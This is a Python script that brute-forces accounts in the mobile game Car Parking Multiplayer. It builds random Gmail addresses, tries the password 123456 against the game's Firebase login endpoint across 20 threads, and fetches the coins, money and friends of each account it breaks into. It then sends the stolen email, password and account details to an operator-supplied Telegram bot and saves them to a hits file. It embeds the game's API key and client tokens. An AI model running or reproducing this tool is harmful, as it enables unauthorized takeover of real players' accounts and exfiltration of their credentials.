import requests , json , datetime , random ,os , threading , webbrowser
try:
    from colorama import Fore
except:
    os.system('pip install colorama')
    from colorama import Fore
try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
    from cfonts import render, say
try:
    from names import get_first_name
except:
    os.system('pip install names')
    from names import get_first_name
os.system('clear')

headers = {
    "Content-Type": "application/json",
    "X-Android-Package": "com.olzhas.carparking.multyplayer",
    "X-Android-Cert": "D4962F8124C2E09A66B97C8E326AFF805489FE39",
    "Accept-Language": "tr-TR, en-US",
    "X-Client-Version": "Android/Fallback/X22001001/FirebaseCore-Android",
    "X-Firebase-GMPID": "1:581727203278:android:af6b7dee042c8df539459f",
    "X-Firebase-Client": "H4sIAAAAAAAAAKtWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; A5010 Build/PI)",
    "Host": "www.googleapis.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
}

a32 = '\x1b[38;5;180m' ; a14 = '\x1b[38;5;153m'
V1 = '\033[2;32m' ; V2 = '\033[1;33m' ; V3='\x1b[38;5;209m' ; V4= '\x1b[1;97m' ; V5 = '\x1b[38;5;8m' ; X= '\033[1;33m' ; F = '\033[2;32m'
a32 = '\x1b[38;5;180m'  # بني فاتح
a14 = '\x1b[38;5;153m'  # أزرق فاتح
P = '\x1b[1;97m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
R1 = '\033[1;31;40m'
X1 = '\033[1;33;40m' 
F1= '\033[1;32;40m' 
C1 = "\033[1;97;40m" 
B1 = '\033[1;36;40m'
K1 = '\033[1;35;40m'
V1 = '\033[1;36;40m'
b = random.randint(5,208)
bo = f'\x1b[38;5;{b}m'
E = '\033[1;31m' #احمر
X= '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
Ca = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
Ca = "\033[1;97m" #ابيض
y = '\033[1;35m'#وردي
f = '\033[2;35m'#بنفسجي
z = '\033[3;33m'#اصفر طوخ
uk= [X,F,f,Y,B,Ca,y]
co1= random.choice(uk)
col2= random.choice(uk)
col3= random.choice(uk)
col4= random.choice(uk)
col5= random.choice(uk)

def clear():

	print(f"{V4} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{V3} @NIT_PROZZ_SMOS {V4}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
	print('\n')
hits=0
bad=0
clear()
ID = input(f'\n{a32} Id Chat 👾: ')
token = input(f'\n{a14} Your Token 👾: ')
os.system('clear' if os.name == 'posix' else 'cls')



def decode_nested_json(d):
    for key, value in d.items():
        if isinstance(value, str):
            try:
                nested_value = json.loads(value)
                d[key] = decode_nested_json(nested_value)
            except json.JSONDecodeError:
                continue
        elif isinstance(value, dict):
            d[key] = decode_nested_json(value)
    return d

def login(email,password):
    global hits,bad
    data = {
        "email": email,
        "password": password,
        "returnSecureToken": True,
        "clientType": "CLIENT_TYPE_ANDROID"
    }
    res = requests.post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", json=data, headers=headers).json()
    if "idToken" in res:
        tkn = res["idToken"]
        data2 = {
            "idToken": tkn
        }
        res2 = requests.post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", json=data2, headers=headers).json()
        deta=res2['users'][0]['createdAt']
        data3 = {
            "data": "2893216D41959108CB8FA08951CB319B7AD80D02"
        }
        he = {
            "authorization": f"Bearer {tkn}",
            "firebase-instance-id-token": "f0Rstd-MTbydQx9M2eLlTM:APA91bF7UdxnXLAaybpBODKCRnyLu44eFWygoIfnLn7kOE9aujlb5WcvTv-EyA5mTNbVBPQ-r-x967XJqEA3TX23gGyXCSbMEEa2PIccvNU98uEcdun1qMgYbCOY4hPBBD2w6G9mfX_m",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.12.13"
        }
        info = requests.post("https://us-central1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords2", json=data3, headers=he).text

        data_account = json.loads(info)
        if 'result' in data_account:data_account['result'] = decode_nested_json(json.loads(data_account['result']))

        result_account = data_account["result"]
        try:Player_name = result_account['Name']
        except:Player_name = 'None'
        try:Friends_count = len(result_account['FriendsID'])
        except:Friends_count = 'None'
        try:Coins = result_account['coin']
        except:Coins = 'None'
        try:Money = result_account['money']
        except:Money = 'None'
        Date_Account = str(datetime.datetime.fromtimestamp(int(deta) / 1000)).split(' ')[0].replace('-', '/')
        msg_text = f'''*~ Car Parking 🚘*\n*———————————*\n*Email : *`{email}`\n*Sifre : *`{password}`\n*——*\n*İsim : {Player_name} 👤*\n*Altın : {Coins} 🪙*\n*Para : {Money} 💰*\n*Arkadas : {Friends_count} 👥*\n*Tarih : {Date_Account} ⌛️*\n*———————————*\n*@ZirveninSonu       @NaowTool *'''
        try:
            
            url = (f'https://api.telegram.org/bot{token}/sendMessage')
            payload = {'chat_id': str(ID), 'text': msg_text, 'parse_mode': 'markdown'}
            requests.post(url, params=payload)
            
            with open('CP HİT.txt', 'a') as f:
                f.write(msg_text + "\n\n")
            
        except:''
        os.system('cls'if os.name=="nt"else"clear")
        hits+=1
        print(f'''{co1}             < ¦ {F} hit  : {Ca}{hits} ~ {E}kötü  Hit {Ca}{bad} ¦ >{P}   ''')
    else:
        os.system('cls'if os.name=="nt"else"clear")
        bad+=1
        print(f'''{co1}             < ¦ {F}hit : {Ca}{hits} ~ {E}kotu hit  {Ca}{bad} ¦ >{P}   ''')
def RunChk():
    while True:
        names = str(get_first_name())
        numbers1 = ''.join(random.choices('1234567890', k=random.randint(1,2)))
        password = 123456
        email = f'{names}{numbers1}@gmail.com'
        login(email,password)

E_TREADING=[]
for i in range(20):
    t = threading.Thread(target=login and RunChk)
    t.start()
    E_TREADING.append(t)
RunChk()